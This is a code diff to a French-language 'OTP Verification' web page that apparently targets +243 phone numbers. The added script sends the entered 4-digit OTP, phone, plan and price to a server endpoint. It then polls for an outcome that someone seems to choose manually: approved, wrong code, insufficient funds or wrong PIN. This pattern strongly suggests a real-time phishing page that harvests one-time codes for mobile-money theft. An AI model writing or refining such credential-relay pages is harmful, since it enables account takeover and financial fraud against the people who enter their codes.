@@ -125,6 +125,56 @@ body {
   cursor: not-allowed;
 }
 
+.submit-btn.active {
+  background: #0b5ed7;
+  cursor: pointer;
+}
+
+.approval-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  background: rgba(255, 255, 255, .95);
+}
+
+.approval-overlay.visible {
+  display: flex;
+}
+
+.approval-content {
+  width: min(100%, 360px);
+  padding: 24px;
+  text-align: center;
+  color: #555;
+}
+
+.approval-content h3 {
+  margin: 20px 0 10px;
+}
+
+.approval-content p {
+  margin: 0 0 20px;
+  font-size: 18px;
+}
+
+.approval-content button {
+  border: none;
+  border-radius: 10px;
+  background: #0b5ed7;
+  color: #fff;
+  cursor: pointer;
+  font-weight: bold;
+  padding: 12px 24px;
+}
+
+.approval-overlay.error-state .approval-content {
+  color: #b42318;
+}
+
 .spinner {
   width: 60px;
   height: 60px;
@@ -159,116 +209,169 @@ body {
   <div class="card">
     <div class="title">OTP Verification</div>
     <div class="subtitle">Enter the OTP sent to your phone number. Do not share the code with anyone.</div>
-    <div class="phone"><p id="phoneNumber"></p></div>
+    <div class="phone"><p id="phoneNum"></p></div>
 
     <div class="otp-label">OTP</div>
 
-    <div class="otp-boxes" id="otp">
-      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 1">
-      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 2">
-      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 3">
-      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 4">
-      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 5">
-      <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric" aria-label="Digit 6">
+    <div class="otp-boxes">
+      <input id="otpInput" type="tel" maxlength="4" pattern="[0-9]*" inputmode="numeric" aria-label="4-digit OTP">
     </div>
 
-    <div class="timer">Resend OTP in <span id="countdown">110</span> seconds</div>
+    <div class="timer">Resend OTP in <span id="timer">60</span> seconds</div>
 
-    <button class="submit-btn" disabled>Submit</button>
+    <button id="submitBtn" class="submit-btn" disabled>Submit</button>
   </div>
 
 </div>
 
-<div id="loadingOverlay" style="
-  display:none;
-  position:fixed;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  background:rgba(255,255,255,.95);
-  z-index:9999;
-  justify-content:center;
-  align-items:center;
-">
-  <div style="text-align:center;">
-    <div class="spinner"></div>
-    <div style="
-      margin-top:20px;
-      font-family:Arial,sans-serif;
-      font-size:20px;
-      font-weight:bold;
-      color:#555;">
-      Waiting for approval...
-    </div>
+<div id="approvalOverlay" class="approval-overlay" role="dialog" aria-modal="true">
+  <div class="approval-content">
+    <div id="spinner" class="spinner"></div>
+    <h3 id="overlayTitle">Vérification de l'OTP</h3>
+    <p id="overlayText">Veuillez patienter... (1s)</p>
+    <p id="deniedMsg" style="display:none;">Code incorrect.</p>
+    <button id="retryBtn" type="button" style="display:none;">Réessayer</button>
   </div>
 </div>
 
 <script>
   const params = new URLSearchParams(window.location.search);
-  const phone = params.get('phone') || '';
-  const phoneNumberEl = document.getElementById('phoneNumber');
+  const phone = params.get('phone');
+  const phoneNumberEl = document.getElementById('phoneNum');
   if (phone) {
-    phoneNumberEl.textContent = '+' + phone;
+    phoneNumberEl.textContent = '+243' + phone;
   }
 
-  const otpInputs = Array.from(document.querySelectorAll('.otp-input'));
-  const submitBtn = document.querySelector('.submit-btn');
+  const otpInput = document.getElementById('otpInput');
+  const submitBtn = document.getElementById('submitBtn');
 
-  function updateSubmitState() {
-    const filled = otpInputs.every(input => input.value.length === 1);
+  otpInput.addEventListener('input', () => {
+    otpInput.value = otpInput.value.replace(/[^0-9]/g, '');
+    const filled = otpInput.value.length === 4;
+    submitBtn.classList.toggle('active', filled);
     submitBtn.disabled = !filled;
-    submitBtn.style.background = filled ? '#0b5ed7' : '#bdbdbd';
-    submitBtn.style.cursor = filled ? 'pointer' : 'not-allowed';
-  }
-
-  otpInputs.forEach((input, index) => {
-    input.addEventListener('input', () => {
-      input.value = input.value.replace(/\D/g, '').slice(0, 1);
-      if (input.value && index < otpInputs.length - 1) {
-        otpInputs[index + 1].focus();
-      }
-      updateSubmitState();
-    });
-
-    input.addEventListener('keydown', (event) => {
-      if (event.key === 'Backspace' && !input.value && index > 0) {
-        otpInputs[index - 1].focus();
-      }
-    });
-
-    input.addEventListener('paste', (event) => {
-      event.preventDefault();
-      const pasted = (event.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-      if (!pasted) return;
-
-      pasted.split('').forEach((digit, i) => {
-        if (otpInputs[index + i]) {
-          otpInputs[index + i].value = digit;
-        }
-      });
-
-      const nextEmpty = otpInputs.find(item => !item.value);
-      if (nextEmpty) nextEmpty.focus();
-      updateSubmitState();
-    });
   });
 
-  let countdownSeconds = 110;
-  const countdownEl = document.getElementById('countdown');
-  const countdownTimer = setInterval(() => {
-    countdownSeconds -= 1;
-    countdownEl.textContent = countdownSeconds;
-    if (countdownSeconds <= 0) {
-      clearInterval(countdownTimer);
-      countdownEl.textContent = '0';
+  let seconds = 60;
+  const timerEl = document.getElementById('timer');
+  const countdown = setInterval(() => {
+    seconds--;
+    if (seconds <= 0) {
+      clearInterval(countdown);
+      timerEl.textContent = '0';
+    } else {
+      timerEl.textContent = seconds;
     }
   }, 1000);
 
-  submitBtn.addEventListener('click', () => {
+  const overlay = document.getElementById('approvalOverlay');
+  const spinner = document.getElementById('spinner');
+  const overlayTitle = document.getElementById('overlayTitle');
+  const overlayText = document.getElementById('overlayText');
+  const deniedMsg = document.getElementById('deniedMsg');
+  const retryBtn = document.getElementById('retryBtn');
+  let pollTimer = null;
+
+  function showOverlayWaiting() {
+    overlay.classList.add('visible');
+    overlay.classList.remove('error-state');
+    spinner.style.display = 'block';
+    overlayTitle.textContent = 'Vérification de l\'OTP';
+    overlayTitle.style.display = 'block';
+    overlayText.style.display = 'block';
+    overlayText.textContent = 'Veuillez patienter... (1s)';
+    deniedMsg.style.display = 'none';
+    retryBtn.style.display = 'none';
+
+    let waitingSeconds = 1;
+    if (window.__otpWaitTimer) clearInterval(window.__otpWaitTimer);
+    window.__otpWaitTimer = setInterval(() => {
+      waitingSeconds += 1;
+      overlayText.textContent = `Veuillez patienter... (${waitingSeconds}s)`;
+    }, 1000);
+  }
+
+  function pollApproval(id) {
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(async () => {
+      try {
+        const response = await fetch('/api/check-approval/' + id);
+        const data = await response.json();
+
+        if (data.status === 'approved') {
+          clearInterval(pollTimer);
+          window.location.href = 'mwish.html?' + params.toString();
+        } else if (data.status === 'denied') {
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          deniedMsg.textContent = 'Code incorrect.';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        } else if (data.status === 'insufficient') {
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          overlay.classList.add('error-state');
+          deniedMsg.textContent = 'Fonds insuffisants.';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        } else if (data.status === 'demo_error') {
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          overlay.classList.add('error-state');
+          deniedMsg.textContent = 'Broche incorrecte.';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        }
+      } catch (error) {
+        // Keep polling after temporary network failures.
+      }
+    }, 2500);
+  }
+
+  retryBtn.addEventListener('click', () => {
+    if (window.__otpWaitTimer) {
+      clearInterval(window.__otpWaitTimer);
+      window.__otpWaitTimer = null;
+    }
+
+    if (deniedMsg.textContent.trim() === 'Broche incorrecte.') {
+      window.location.href = 'trial.html';
+      return;
+    }
+
+    overlay.classList.remove('visible');
+  });
+
+  submitBtn.addEventListener('click', async () => {
     if (submitBtn.disabled) return;
-    const overlay = document.getElementById('loadingOverlay');
-    overlay.style.display = 'flex';
+    showOverlayWaiting();
+
+    try {
+      const response = await fetch('/api/request-approval', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          plan: params.get('plan'),
+          price: params.get('price'),
+          phone,
+          otp: otpInput.value,
+          step: 'otp'
+        })
+      });
+      const data = await response.json();
+      pollApproval(data.id);
+    } catch (error) {
+      overlayTitle.textContent = 'Erreur de connexion';
+      overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
+      spinner.style.display = 'none';
+      retryBtn.style.display = 'inline-block';
+    }
   });
 </script>
 
